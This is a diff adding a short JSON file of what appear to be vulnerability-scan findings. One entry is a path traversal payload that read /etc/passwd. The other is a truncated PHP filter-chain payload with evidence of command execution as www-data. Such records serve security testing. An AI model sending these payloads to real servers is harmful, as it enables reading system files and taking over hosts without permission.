@@ -1,0 +1,6 @@
+[
+  {"module": "traversal", "signal": "root:x:0:0", "payload": "../../../../etc/passwd",
+   "status": 200, "length": 1523, "evidence": "root:x:0:0:root:/root:/bin/bash"},
+  {"module": "filter_chain_rce", "signal": "INCLUDED_RCE_OK", "payload": "php://filter/convert...",
+   "status": 200, "length": 42, "evidence": "uid=33(www-data) gid=33(www-data)"}
+]
